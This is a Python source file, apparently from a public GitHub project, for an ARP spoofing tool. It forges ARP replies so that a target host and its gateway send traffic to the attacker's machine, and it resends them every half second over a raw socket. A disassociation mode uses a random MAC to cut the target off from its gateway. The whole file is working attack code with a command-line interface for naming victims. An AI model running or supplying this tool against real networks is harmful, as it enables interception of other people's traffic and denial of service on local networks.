#!/usr/bin/env python3
# https://github.com/EONRaider/Arp-Spoofer

__author__ = 'EONRaider @ keybase.io/eonraider'

import argparse
import random
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW

from protocols import ARP, Ethernet, Packet


class AttackPackets(object):
    def __init__(self, *, attacker_mac: str, gateway_mac: str, gateway_ip: str,
                 target_mac: str, target_ip: str):
        self.attacker_mac = attacker_mac
        self.gateway_mac = gateway_mac
        self.gateway_ip = gateway_ip
        self.target_mac = target_mac
        self.target_ip = target_ip
        self.payloads = self.payload_to_gateway, self.payload_to_target

    def __iter__(self):
        yield from self.payloads

    @property
    def payload_to_gateway(self):
        gateway = Packet(Ethernet(dst=self.gateway_mac, src=self.attacker_mac,
                                  eth=0x0806),
                         ARP(sha=self.attacker_mac, spa=self.target_ip,
                             tha=self.gateway_mac, tpa=self.gateway_ip))
        return gateway.payload

    @property
    def payload_to_target(self):
        target = Packet(Ethernet(dst=self.target_mac, src=self.attacker_mac,
                                 eth=0x0806),
                        ARP(sha=self.attacker_mac, spa=self.gateway_ip,
                            tha=self.target_mac, tpa=self.target_ip))
        return target.payload


class Spoofer(object):
    def __init__(self, interface: str):
        self.interface = interface

    def execute(self, spoofed_packets, interval: float = 0.5):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.interface, htons(0x0800)))
            while True:
                for packet in spoofed_packets:
                    sock.send(packet)
                time.sleep(interval)


def spoof(args):
    """Controls the flow of execution of the ARP Spoofer tool."""

    if args.disassociate is True:
        hex_values = '0123456789ABCDEF'
        args.attackermac = ':'.join(''.join(random.choices(hex_values, k=2))
                                    for _ in range(6))

    packets = AttackPackets(attacker_mac=args.attackermac,
                            gateway_mac=args.gatemac, gateway_ip=args.gateip,
                            target_mac=args.targetmac, target_ip=args.targetip)
    spoofer = Spoofer(interface=args.interface)

    print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
    try:
        spoofer.execute(packets, interval=args.interval)
    except KeyboardInterrupt:
        raise SystemExit('[!] ARP Spoofing attack terminated.')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    attack = parser.add_mutually_exclusive_group(required=True)
    parser.add_argument('interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    attack.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the Network Interface Controller '
                             '(NIC) used by the attacker.')
    attack.add_argument('--disassociate', action='store_true',
                        help='Execute a disassociation attack in which a '
                             'randomized MAC address is set for the attacker '
                             'machine, effectively making the target host send '
                             'packets to a non-existent gateway.')
    parser.add_argument('--gatemac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, required=True, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gateip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                        help='IP address currently assigned to the target.')
    parser.add_argument('--interval', type=float, default=0.5, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 0.5 seconds).')
    spoof(parser.parse_args())
